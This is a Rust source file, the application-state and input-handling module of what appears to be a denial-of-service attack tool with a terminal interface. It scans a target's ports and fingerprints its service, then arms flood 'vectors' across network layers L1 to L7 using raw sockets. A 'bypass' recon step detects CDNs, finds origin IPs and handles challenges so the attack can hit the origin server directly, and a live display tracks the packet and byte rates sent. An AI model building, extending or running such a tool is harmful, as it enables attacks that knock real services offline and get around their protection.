//! Application state and input handling.

use std::collections::VecDeque;
use std::sync::atomic::{AtomicBool, AtomicU32};
use std::sync::Arc;
use std::time::Instant;

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use tokio::sync::mpsc;

use crate::attack::{self, Ctx};
use crate::bypass;
use crate::health::{self, Health};
use crate::net::raw::{self, Iface, RawSock};
use crate::stats::Stats;
use crate::target::{self, Target};
use crate::vectors::{self, Vector, ALL};

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Phase {
    Input,
    Scanning,
    Ready,
    Running,
    Stopped,
}

pub struct ScanOutcome {
    pub target: Result<Target, String>,
}

pub struct App {
    pub target_input: String,
    pub port_input: String,
    pub minutes_input: String,
    pub focus: usize,
    pub phase: Phase,
    pub target: Option<Target>,
    pub selected: [bool; ALL.len()],
    pub cursor: usize,
    pub auto_mode: bool,
    pub stats: Option<Arc<Stats>>,
    pub log: Vec<String>,
    pub message: String,
    pub iface: Option<Iface>,
    pub raw_ok: bool,
    pub quit: bool,
    pub pps: f64,
    pub bps: f64,
    pub open_ports: Vec<u16>,
    pub scan_seen: u32,
    pub scan_total: u32,
    pub started_at: Option<Instant>,
    pub deadline: Option<Instant>,
    pub limit_secs: u64,
    pub health: Option<Arc<Health>>,
    pub recon: Option<Arc<bypass::Recon>>,
    samples: VecDeque<(Instant, u64, u64)>,
    scan_rx: Option<mpsc::Receiver<ScanOutcome>>,
    port_rx: Option<mpsc::UnboundedReceiver<u16>>,
    recon_rx: Option<mpsc::Receiver<bypass::Recon>>,
    health_stop: Option<Arc<AtomicBool>>,
}

impl App {
    pub fn new() -> Self {
        let mut log = Vec::new();
        let (iface, raw_ok) = match raw::discover() {
            Ok(i) => {
                let ok = RawSock::open(&i).is_ok();
                log.push(format!(
                    "interface {} ({}), raw sockets: {}",
                    i.name,
                    i.ip,
                    if ok { "ok" } else { "unavailable" }
                ));
                (Some(i), ok)
            }
            Err(e) => {
                log.push(format!("no raw interface: {e}"));
                (None, false)
            }
        };
        if !raw_ok {
            log.push("L1-L4 raw vectors disabled (need root + CAP_NET_RAW)".into());
        }
        Self {
            target_input: String::new(),
            port_input: String::new(),
            minutes_input: String::new(),
            focus: 0,
            phase: Phase::Input,
            target: None,
            selected: [false; ALL.len()],
            cursor: 0,
            auto_mode: true,
            stats: None,
            log,
            message: "enter a target, then press Enter to scan".into(),
            iface,
            raw_ok,
            quit: false,
            pps: 0.0,
            bps: 0.0,
            open_ports: Vec::new(),
            scan_seen: 0,
            scan_total: 0,
            started_at: None,
            deadline: None,
            limit_secs: 0,
            samples: VecDeque::new(),
            scan_rx: None,
            port_rx: None,
            recon_rx: None,
            health_stop: None,
            health: None,
            recon: None,
        }
    }

    pub fn note(&mut self, s: impl Into<String>) {
        let s = s.into();
        self.log.push(s);
        if self.log.len() > 300 {
            self.log.remove(0);
        }
    }

    pub fn selected_vectors(&self) -> Vec<Vector> {
        ALL.iter()
            .filter(|s| self.selected[s.vector.index()])
            .map(|s| s.vector)
            .collect()
    }

    fn toggle(&mut self, i: usize) {
        let v = ALL[i].vector;
        if v.needs_raw() && !self.raw_ok {
            self.message = format!("{} needs raw sockets (run as root)", v.name());
            return;
        }
        self.selected[i] = !self.selected[i];
        self.auto_mode = false;
    }

    fn toggle_layer(&mut self, layer: &str) {
        let idx: Vec<usize> = ALL
            .iter()
            .enumerate()
            .filter(|(_, s)| s.layer == layer && (!s.raw || self.raw_ok))
            .map(|(i, _)| i)
            .collect();
        if idx.is_empty() {
            self.message = format!("{layer} unavailable");
            return;
        }
        let any_off = idx.iter().any(|i| !self.selected[*i]);
        for i in idx {
            self.selected[i] = any_off;
        }
        self.auto_mode = false;
        self.message = format!("{layer} {}", if any_off { "armed" } else { "cleared" });
    }

    fn apply_plan(&mut self) {
        let Some(t) = &self.target else { return };
        let plan = vectors::plan_for(t.service, t.port, self.raw_ok);
        self.selected = [false; ALL.len()];
        for v in &plan {
            self.selected[v.index()] = true;
        }
    }

    pub fn start_scan(&mut self) {
        let input = self.target_input.clone();
        let port = self.port_input.clone();
        let mut t = match Target::parse(&input, &port) {
            Ok(t) => t,
            Err(e) => {
                self.message = e;
                return;
            }
        };
        let minutes = self.minutes_input.trim().to_string();
        self.limit_secs = if minutes.is_empty() {
            0
        } else {
            match minutes.parse::<u64>() {
                Ok(m) => m.saturating_mul(60),
                Err(_) => {
                    self.message = "minutes must be a number (0 = unlimited)".into();
                    return;
                }
            }
        };

        self.phase = Phase::Scanning;
        self.open_ports.clear();
        self.scan_seen = 0;
        self.scan_total = 0;
        self.message = "resolving target...".into();

        let (tx, rx) = mpsc::channel(1);
        let (ptx, prx) = mpsc::unbounded_channel();
        self.scan_rx = Some(rx);
        self.port_rx = Some(prx);

        tokio::spawn(async move {
            let res = async {
                t.resolve()?;
                let ip = t.primary().ok_or("target has no address")?;
                if t.port.is_none() {
                    let progress = Arc::new(AtomicU32::new(0));
                    let ports = target::scan_all_ports(ip, ptx, progress).await;
                    let (svc, chosen) = target::best_service(&ports);
                    t.service = svc;
                    t.port = chosen;
                    if svc == target::Service::Https {
                        t.tls = true;
                    }
                    if chosen.is_some() {
                        let _ = target::fingerprint(&mut t);
                    }
                } else {
                    target::fingerprint(&mut t)?;
                }
                Ok::<Target, String>(t)
            }
            .await;
            let _ = tx.send(ScanOutcome { target: res }).await;
        });
    }

    pub fn poll_scan(&mut self) {
        if let Some(rx) = self.port_rx.as_mut() {
            while let Ok(p) = rx.try_recv() {
                self.open_ports.push(p);
                self.open_ports.sort_unstable();
                self.scan_seen += 1;
            }
        }
        let Some(rx) = self.scan_rx.as_mut() else {
            return;
        };
        let Some(out) = rx.try_recv().ok() else {
            return;
        };
        self.scan_rx = None;
        self.port_rx = None;
        match out.target {
            Ok(t) => {
                let ips = t
                    .ips
                    .iter()
                    .map(|i| i.to_string())
                    .collect::<Vec<_>>()
                    .join(", ");
                let ports = if self.open_ports.is_empty() {
                    "-".to_string()
                } else {
                    self.open_ports
                        .iter()
                        .map(|p| p.to_string())
                        .collect::<Vec<_>>()
                        .join(",")
                };
                self.note(format!(
                    "target {} -> {} | service: {} | port {} | open: {}",
                    t.input,
                    ips,
                    t.service.label(),
                    t.port.map(|p| p.to_string()).unwrap_or_else(|| "-".into()),
                    ports
                ));
                self.target = Some(t);
                if self.auto_mode {
                    self.apply_plan();
                } else if self.selected_vectors().is_empty() {
                    self.apply_plan();
                }
                let n = self.selected_vectors().len();
                self.message = format!(
                    "{} vectors armed ({}) - Enter to start",
                    n,
                    if self.auto_mode { "auto" } else { "manual" }
                );
                self.phase = Phase::Ready;

                // Recon runs after the target is known: CDN detection, origin
                // discovery and challenge handling.
                let ips = self.target.as_ref().map(|t| t.ips.clone()).unwrap_or_default();
                if let Some(t) = &self.target {
                    let port = t.port.unwrap_or(if t.tls { 443 } else { 80 });
                    let tls = t.tls;
                    let host = t.host.clone();
                    let (tx, rx) = mpsc::channel(1);
                    self.recon_rx = Some(rx);
                    tokio::spawn(async move {
                        let r = bypass::run(&ips, port, tls, &host).await;
                        let _ = tx.send(r).await;
                    });
                }
            }
            Err(e) => {
                self.note(format!("scan failed: {e}"));
                self.message = e;
                self.phase = Phase::Input;
            }
        }
    }

    pub fn poll_recon(&mut self) {
        let Some(rx) = self.recon_rx.as_mut() else {
            return;
        };
        let Some(r) = rx.try_recv().ok() else {
            return;
        };
        self.recon_rx = None;
        self.note(format!("recon: {}", bypass::summary(&r)));
        self.recon = Some(Arc::new(r));
    }

    pub fn begin_attack(&mut self) {
        let Some(t) = self.target.clone() else {
            self.message = "scan a target first".into();
            return;
        };
        let vectors = self.selected_vectors();
        if vectors.is_empty() {
            self.message = "no vectors selected".into();
            return;
        }
        let Some(ip) = t.primary() else {
            self.message = "target has no address".into();
            return;
        };

        let stats = Arc::new(Stats::new());
        let raw = if self.raw_ok {
            self.iface
                .as_ref()
                .and_then(|i| RawSock::open(i).ok())
                .map(Arc::new)
        } else {
            None
        };
        let port = t.port.unwrap_or_else(|| {
            vectors
                .first()
                .map(|v| vectors::default_port(*v))
                .unwrap_or(80)
        });

        let ctx = Arc::new(Ctx {
            target: t.clone(),
            port,
            iface: self.iface.clone(),
            raw,
            stats: stats.clone(),
            cookie: self.recon.as_ref().and_then(|r| r.cookie.clone()),
            budgets: ALL
                .iter()
                .map(|s| Arc::new(attack::Budget::new(attack::raw_rate(s.vector))))
                .collect(),
        });

        let h = Arc::new(Health::new());
        let stop = Arc::new(AtomicBool::new(false));
        health::spawn(h.clone(), ip, port, stop.clone());
        self.health = Some(h);
        self.health_stop = Some(stop);

        self.note(format!(
            "attacking {ip}:{port} with {} vectors{}",
            vectors.len(),
            if self.limit_secs > 0 {
                format!(" for {}m", self.limit_secs / 60)
            } else {
                String::new()
            }
        ));
        attack::launch(ctx, vectors);
        self.stats = Some(stats);
        self.started_at = Some(Instant::now());
        self.deadline = if self.limit_secs > 0 {
            Some(Instant::now() + std::time::Duration::from_secs(self.limit_secs))
        } else {
            None
        };
        self.samples.clear();
        self.phase = Phase::Running;
        self.message = "running - Enter/x to stop".into();
    }

    pub fn stop_attack(&mut self) {
        if let Some(s) = &self.stats {
            s.stop();
        }
        if let Some(s) = &self.health_stop {
            s.store(true, std::sync::atomic::Ordering::Relaxed);
        }
        self.deadline = None;
        self.phase = Phase::Stopped;
        self.message = "stopped - Enter to restart, Esc to edit target".into();
        self.note("attack stopped".to_string());
    }

    pub fn remaining(&self) -> Option<u64> {
        self.deadline
            .map(|d| d.saturating_duration_since(Instant::now()).as_secs())
    }

    pub fn tick(&mut self) {
        self.poll_recon();
        if self.phase == Phase::Running {
            if let Some(d) = self.deadline {
                if Instant::now() >= d {
                    self.stop_attack();
                    self.message = "time limit reached".into();
                }
            }
        }
        let Some(s) = &self.stats else { return };
        let now = Instant::now();
        let p = s.total_packets();
        let b = s.total_bytes();
        self.samples.push_back((now, p, b));
        while self.samples.len() > 2
            && now.duration_since(self.samples.front().unwrap().0).as_secs_f64() > 2.0
        {
            self.samples.pop_front();
        }
        if let Some((t0, p0, b0)) = self.samples.front().copied() {
            let dt = now.duration_since(t0).as_secs_f64();
            if dt > 0.2 {
                self.pps = (p.saturating_sub(p0)) as f64 / dt;
                self.bps = (b.saturating_sub(b0)) as f64 / dt;
            }
        }
    }

    pub fn handle_key(&mut self, k: KeyEvent) {
        if k.modifiers.contains(KeyModifiers::CONTROL) && k.code == KeyCode::Char('c') {
            self.quit = true;
            return;
        }
        match self.phase {
            Phase::Input | Phase::Scanning => self.key_input(k),
            Phase::Ready => self.key_ready(k),
            Phase::Running => self.key_running(k),
            Phase::Stopped => self.key_stopped(k),
        }
    }

    fn key_input(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Char(c) => {
                if self.focus == 0 {
                    self.target_input.push(c);
                } else if c.is_ascii_digit() {
                    let field = if self.focus == 1 {
                        &mut self.port_input
                    } else {
                        &mut self.minutes_input
                    };
                    if field.len() < 5 {
                        field.push(c);
                    }
                }
            }
            KeyCode::Backspace => match self.focus {
                0 => {
                    self.target_input.pop();
                }
                1 => {
                    self.port_input.pop();
                }
                _ => {
                    self.minutes_input.pop();
                }
            },
            KeyCode::Tab => self.focus = (self.focus + 1) % 3,
            KeyCode::BackTab => self.focus = (self.focus + 2) % 3,
            KeyCode::Enter => self.start_scan(),
            KeyCode::Esc => {
                if self.target_input.is_empty()
                    && self.port_input.is_empty()
                    && self.minutes_input.is_empty()
                {
                    self.quit = true;
                } else {
                    self.target_input.clear();
                    self.port_input.clear();
                    self.minutes_input.clear();
                }
            }
            _ => {}
        }
    }

    fn key_ready(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Up => self.cursor = self.cursor.saturating_sub(1),
            KeyCode::Down => self.cursor = (self.cursor + 1).min(ALL.len() - 1),
            KeyCode::Char(' ') => self.toggle(self.cursor),
            KeyCode::Enter => self.begin_attack(),
            KeyCode::Esc => {
                self.phase = Phase::Input;
                self.focus = 0;
                self.message = "edit target and press Enter to rescan".into();
            }
            KeyCode::Char('a') => {
                for i in 0..ALL.len() {
                    if !ALL[i].raw || self.raw_ok {
                        self.selected[i] = true;
                    }
                }
                self.auto_mode = false;
            }
            KeyCode::Char('n') => {
                self.selected = [false; ALL.len()];
                self.auto_mode = false;
            }
            KeyCode::Char('m') => {
                self.auto_mode = !self.auto_mode;
                if self.auto_mode {
                    self.apply_plan();
                    self.message = "auto layer selection".into();
                } else {
                    self.message = "manual layer selection".into();
                }
            }
            KeyCode::Char(c @ '1'..='7') => {
                let layer = format!("L{c}");
                self.toggle_layer(&layer);
            }
            KeyCode::Char('o') => {
                let ip = self.recon.as_ref().and_then(|r| r.origins.first().copied());
                match ip {
                    Some(ip) => {
                        if let Some(t) = self.target.as_mut() {
                            t.ips = vec![ip];
                        }
                        self.note(format!("retargeted to origin {ip}"));
                        self.message = format!("targeting origin {ip} directly");
                    }
                    None => {
                        self.message = if self.recon.is_some() {
                            "no origin found".into()
                        } else {
                            "recon still running".into()
                        }
                    }
                }
            }
            _ => {}
        }
    }

    fn key_running(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Enter | KeyCode::Char('x') => self.stop_attack(),
            KeyCode::Char('q') => self.quit = true,
            _ => {}
        }
    }

    fn key_stopped(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Enter => self.begin_attack(),
            KeyCode::Esc => {
                self.phase = Phase::Input;
                self.focus = 0;
            }
            KeyCode::Char('q') => self.quit = true,
            _ => {}
        }
    }

    pub fn service_label(&self) -> &'static str {
        self.target
            .as_ref()
            .map(|t| t.service.label())
            .unwrap_or("not scanned")
    }

    pub fn is_tls(&self) -> bool {
        self.target.as_ref().map(|t| t.tls).unwrap_or(false)
    }
}

impl Default for App {
    fn default() -> Self {
        Self::new()
    }
}
